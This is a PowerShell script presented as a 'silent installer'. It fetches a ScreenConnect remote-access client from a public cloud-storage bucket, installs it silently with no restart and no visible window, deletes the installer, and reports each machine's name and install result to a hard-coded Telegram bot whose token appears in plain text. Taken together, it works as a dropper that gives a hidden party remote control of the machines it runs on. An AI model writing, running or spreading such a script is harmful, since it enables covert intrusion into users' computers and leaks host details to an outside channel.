# ==============================================================================
# Script Name: install.ps1
# Description: Fixed ScreenConnect silent installer with Telegram notifications
# ==============================================================================

# 1. TELEGRAM CONFIGURATION
$BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
$ChatID   = "6867549905"

# 2. APPLICATION CONFIGURATION - Stripped broken markdown formatting
$MsiUrl    = "https://pub-14dda660d9ed46a491b2c11bd2890715.r2.dev/ScreenConnect.ClientSetup(1).msi"
$TempDir   = "C:\Windows\Temp"
$MsiPath   = Join-Path $TempDir "ScreenConnectSetup.msi"
$LogPath   = "C:\Windows\Temp\ScreenConnect_Install.log"
$Computer  = $env:COMPUTERNAME

# Enable both TLS 1.2 and 1.3 while leaving default protocols fallback active for HTTP IPs
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

# Function to send Telegram messages safely via JSON POST
function Send-TelegramAlert {
    param([string]$Message)
    try {
        $Payload = @{
            chat_id = $ChatID
            text    = $Message
        } | ConvertTo-Json -Compress -Depth 2

        # Stripped broken markdown link brackets from Telegram endpoint
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                          -Method Post `
                          -ContentType "application/json; charset=utf-8" `
                          -Body $Payload -ErrorAction Stop | Out-Null
    } catch {
        Write-Warning "Failed to send Telegram notification: $($_.Exception.Message)"
    }
}

# 3. Execution Logic
try {
    Write-Output "Downloading ScreenConnect MSI..."

    # Pre-clean stale installer paths to avoid conflicts
    if (Test-Path $MsiPath) { Remove-Item $MsiPath -Force -ErrorAction SilentlyContinue }

    # Primary download engine
    Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiPath -UseBasicParsing -ErrorAction Stop

    # Fallback to WebClient if IWR failed to produce a usable file
    if (-not (Test-Path $MsiPath) -or (Get-Item $MsiPath).Length -eq 0) {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($MsiUrl, $MsiPath)
    }

    # Validate: a real MSI is at least 1KB — protects against HTML error pages saved as .msi
    if (-not (Test-Path $MsiPath) -or (Get-Item $MsiPath).Length -lt 1024) {
        throw "Downloaded file is missing or too small (likely an error page)."
    }

    Write-Output "Download completed successfully."
}
catch {
    $Msg = "❌ ScreenConnect Download FAILED`nPC: $Computer`nError: $($_.Exception.Message)"
    Send-TelegramAlert -Message $Msg
    exit 1
}

if (Test-Path $MsiPath) {
    Write-Output "Starting silent installation..."

    # Build arguments cleanly
    $Arguments = "/i `"$MsiPath`" /qn /norestart /L*V `"$LogPath`""

    $Process = Start-Process -FilePath "msiexec.exe" -ArgumentList $Arguments -Wait -NoNewWindow -PassThru

    # Clean up the downloaded installer file after execution
    Remove-Item -Path $MsiPath -Force -ErrorAction SilentlyContinue

    # Handle the Exit Code (0 = success, 3010 = success-reboot-pending)
    if ($Process.ExitCode -eq 0 -or $Process.ExitCode -eq 3010) {
        $Status = if ($Process.ExitCode -eq 3010) { "Installed successfully (Reboot Pending)." } else { "Installed successfully." }
        $Msg = "✅ ScreenConnect Deployment Success`nPC: $Computer`nStatus: $Status"
        Send-TelegramAlert -Message $Msg
        exit 0
    }
    else {
        $Msg = "❌ ScreenConnect Deployment FAILED`nPC: $Computer`nExit Code: $($Process.ExitCode)`nCheck local log at: $LogPath"
        Send-TelegramAlert -Message $Msg
        exit $Process.ExitCode
    }
} else {
    $Msg = "❌ ScreenConnect Deployment FAILED`nPC: $Computer`nError: File download validation failed."
    Send-TelegramAlert -Message $Msg
    exit 1
}
